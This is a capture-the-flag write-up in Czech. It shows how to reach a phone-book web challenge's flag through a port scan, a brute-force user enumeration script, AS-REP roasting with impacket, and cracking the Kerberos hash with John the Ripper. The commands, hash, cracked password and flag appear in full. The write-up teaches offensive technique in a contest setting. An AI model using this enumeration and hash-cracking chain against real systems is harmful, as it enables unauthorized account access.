# Phone Book

## Zadání

```
Hi Expert,

the archaeologists are looking forward to get some phone numbers from the phone book running on http://78.128.246.142, don't make them wait too long.

Good Luck!

Hint: It looks like that only logged users can see the phone numbers.
Hint: Check also other services on given server 78.128.246.142.
Hint: Impacket is not always the best friend, sometimes John suite works better, especially for non-windows platforms.
```

## Řešení

### 1. Běžící služby na serveru

```
nmap -p 1-65535 78.128.246.142

Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-27 20:43 CEST
Nmap scan report for 78.128.246.142
Host is up (0.0087s latency).
Not shown: 65530 closed ports
PORT     STATE    SERVICE
80/tcp   open     http
88/tcp   open     kerberos-sec
517/tcp  filtered talk
518/tcp  filtered ntalk
2376/tcp filtered docker
```

Autorizace uživatelů tak zřejmě probíhá pomocí kerberos.

### 2. Seznam uživatelů
Na stránce http://78.128.246.142/ lze kromě přihlášení i hledat aktivní uživatele systému pomocí minimálně dvou znaků.
Seznam uživatelu získáme pomocí brute force:

```python
import requests
import string

users = set()

for i in string.ascii_letters:
    for j in string.ascii_letters:
        pay = i + j
        r = requests.post('http://78.128.246.142/search', data={'query': pay})
        if 'email: ' in r.text:
            user = r.text.split('email: ')[1].split('<p>')[0]
            #print(user)
            users.add(user)

for user in users:
    print(user)
```

Výsledný seznam uživatelů - uložíme do `users.txt`: 

```
bill@superphonebook.tcc
aaron@superphonebook.tcc
harmj0y@superphonebook.tcc
tytso@superphonebook.tcc
```

### 3. ASREPRoast pomocí impacket

Někteří uživatelé mohou mít vypnutou pre-autorizaci, pak lze získat hash hesla: https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast

```
python3 GetNPUsers.py SUPERPHONEBOOK.TCC/ -dc-ip 78.128.246.142 -usersfile users.txt

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$18$tytso@superphonebook.tcc@SUPERPHONEBOOK.TCC:95d27bbb3f5c6a83bbd56e783674ecd4$cd4c653440ed01c3ad41c70d137d65057b25b1ea7be81f312dc31e7d7077f86c37264741bca73d9bbd60f3b2666e3d006119d9db752dec67d6d6a79804c7af746d6591fead9b1ecd1e9bb907ba7180b521cd73a84ded47c58166738ad494223833d7ca0a4d49fee54206c8b9a13cd75f06b8df7179458040d5a6fa1d88509e7a917e41d04ca0122a9d1e09d519521068acc9cfffae97011837c229730eb45201901e16a0548a560e94f6d3b4a6eb3dc9cfcdbea707fd2dbe070be026c953bd58d694bde29360eb49c8b41a7a2510c93ce4483a6736756406d3dcd1dd34cc18c164274def2935
```

### 4. Cracknutí hash

Hash získaný pomocí impacket ovšem není ve správném formátu (viz hint k úloze). Správný formát hashe pro crackování v `john` lze najít ve zdrojovém kódu: https://github.com/openwall/john/blob/bleeding-jumbo/src/krb5_asrep_fmt_plug.c

```
$krb5asrep$18$EXAMPLE.COMlulu$< DATA >$< 24B >"
```

Upravíme hash (získanou ve 3.) dle požadovaného formátu a uložíme do souboru `hash`:

```
$krb5asrep$18$SUPERPHONEBOOK.TCCtytso$95d27bbb3f5c6a83bbd56e783674ecd4cd4c653440ed01c3ad41c70d137d65057b25b1ea7be81f312dc31e7d7077f86c37264741bca73d9bbd60f3b2666e3d006119d9db752dec67d6d6a79804c7af746d6591fead9b1ecd1e9bb907ba7180b521cd73a84ded47c58166738ad494223833d7ca0a4d49fee54206c8b9a13cd75f06b8df7179458040d5a6fa1d88509e7a917e41d04ca0122a9d1e09d519521068acc9cfffae97011837c229730eb45201901e16a0548a560e94f6d3b4a6eb3dc9cfcdbea707fd2dbe070be026c953bd58d694bde29360eb49c8b41a7a2510c93ce4483a6736756406d3dc$d1dd34cc18c164274def2935
```

Spustíme john the ripper:

```
john hash

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
garfunkel4       (?)
1g 0:00:00:02 DONE 2/3 (2021-10-27 20:59) 0.3759g/s 18478p/s 18478c/s 18478C/s utopia4..ship4
Use the "--show" option to display all of the cracked passwords reliably
Session complete
```

Heslo `garfunkel4` je nalezeno během pár vteřin. Na tomto místě bych ale chtěl poznamenat, že toto heslo je sice ve výchozím slovníku john `/usr/share/john/password.lst`, ale není například ve známém slovníku `rockyou.txt`.
Takže například `john --wordlist=rockyou.txt --rules=best64 hash` nevede k cíli...

### 5. Získání vlajky

Na stránce se přihlásíme pomocí jména `tytso` a hesla `garfunkel4`. Vlajku lze zobrazit v tel. čísle uživatele `tytso` (stačí vyhledat `th`):

```
email: tytso@superphonebook.tcc
name: Theodore Ts'o

homepage:

phone: FLAG{MLeq-38Tt-Y1Tz-NdE9}
```

